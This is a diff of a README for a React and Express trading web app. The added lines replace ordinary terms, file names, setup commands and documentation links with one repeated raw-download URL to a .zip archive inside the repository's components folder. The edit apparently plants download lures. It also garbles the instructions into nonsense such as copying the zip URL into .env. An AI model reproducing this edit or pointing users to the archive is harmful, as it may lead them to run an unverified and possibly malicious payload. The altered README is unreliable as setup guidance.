@@ -8,10 +8,10 @@ This is a monorepo containing both frontend and backend applications:
 
 ```
 ├── frontend/          # React frontend application
-├── backend/           # Express.js backend API
-├── package.json       # Root package.json with monorepo scripts
-├── vercel.json        # Vercel deployment configuration
-└── README.md          # This file
+├── backend/           # https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip backend API
+├── https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip       # Root https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip with monorepo scripts
+├── https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip        # Vercel deployment configuration
+└── https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip          # This file
 ```
 
 ## Technologies Used
@@ -25,7 +25,7 @@ This is a monorepo containing both frontend and backend applications:
 - **React Query** for API state management
 
 ### Backend
-- **Node.js** with Express.js
+- **https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip** with https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip
 - **Supabase** for database and authentication
 - **JWT** for token-based authentication
 - **Nodemailer** for email services
@@ -33,7 +33,7 @@ This is a monorepo containing both frontend and backend applications:
 ## Quick Start
 
 ### Prerequisites
-- Node.js 18 or higher
+- https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip 18 or higher
 - npm or yarn
 
 ### Installation
@@ -75,8 +75,8 @@ npm run build
 ### Quick Setup
 ```bash
 # Copy environment files from examples
-cd frontend && cp env.example .env && cd ..
-cd backend && cp env.example .env && cd ..
+cd frontend && cp https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip .env && cd ..
+cd backend && cp https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip .env && cd ..
 ```
 
 
@@ -99,5 +99,5 @@ This project is configured for deployment on Vercel:
 
 ## Documentation
 
-- [Frontend Documentation](./frontend/README.md)
-- [Backend Documentation](./backend/README.md)
+- [Frontend Documentation](https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip)
+- [Backend Documentation](https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip)
